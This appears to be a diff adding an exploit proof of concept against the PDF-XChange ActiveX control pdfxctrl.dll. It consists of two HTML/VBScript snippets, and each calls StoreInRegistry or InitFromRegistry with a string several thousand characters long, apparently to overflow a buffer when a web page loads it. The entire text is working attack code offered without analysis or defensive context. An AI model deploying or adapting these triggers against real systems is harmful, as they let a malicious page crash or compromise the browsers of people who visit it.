@@ -1,0 +1,23 @@
+<object classid='clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18' id='zsl' />
+<script language='vbscript'>
+targetFile = "C:\PDF-XChange\pdfSaver\pdfxctrl.dll"
+prototype  = "Sub StoreInRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_path As String )"
+memberName = "StoreInRegistry"
+progid     = "pdfxctrlLib.PdfPrinterPreferences"
+argCount   = 2
+arg1=1
+arg2=String(6164, "A")
+zsl.StoreInRegistry arg1 ,arg2
+</script>
+--------------------
+<object classid='clsid:2EE01CFA-139F-431E-BB1D-5E56B4DCEC18' id='zsl' />
+<script language='vbscript'>
+targetFile = "C:\PDF-XChange\pdfSaver\pdfxctrl.dll"
+prototype  = "Sub InitFromRegistry ( ByVal page_id As PdfPrinterDialogPage ,  ByVal sub_key As String )"
+memberName = "InitFromRegistry"
+progid     = "pdfxctrlLib.PdfPrinterPreferences"
+argCount   = 2
+arg1=1
+arg2=String(14356, "A")
+zsl.InitFromRegistry arg1 ,arg2
+</script>
